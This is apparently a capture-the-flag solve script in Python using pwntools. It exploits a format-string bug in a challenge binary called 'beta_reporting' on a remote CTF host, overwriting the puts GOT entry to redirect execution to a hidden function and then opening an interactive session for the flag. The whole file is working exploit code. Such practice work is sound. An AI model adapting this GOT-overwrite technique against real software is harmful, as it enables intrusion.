from pwn import *

LOCAL = False
GDB = False

context.binary = "./beta_reporting"
context.terminal =['tmux','splitw','-h']
# initial setup
if GDB and LOCAL:
    p = gdb.debug(context.binary.path, gdbscript='''
    init-pwndbg
    continue
    ''')
elif LOCAL:
    p = process(context.binary.path)
else:
    p = remote("yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg",30121)

# helper functions
def makereport(report):
    p.clean()
    p.sendline(str(1))
    p.clean()
    p.sendline(report)
    log.info(p.recv())

def viewreport(name,reportno):
    p.clean()
    p.sendline(str(2))
    p.clean()
    p.sendline(name)
    p.clean()
    p.sendline(reportno)

# Creating the payload
payload = fmtstr_payload(11-6,{context.binary.got['puts']:context.binary.symbols['unknownfunction']},write_size='short')
# Splitting the payload into puts got address
# Suppose to go into the stack
writelocation = payload[-8:]
# Splitting the payload to get the string format portion 
# Suppose to go into the heap
strfmt = payload[:-8]
# debugging
print(strfmt)
p.clean()
# Calling the magicfunction
p.sendline(str(4))
# Sending our string format to the heap
makereport(strfmt)
# Sending our puts got address into the username and triggering the exploit
viewreport(writelocation,str(1))
# Yay flag!
p.interactive()
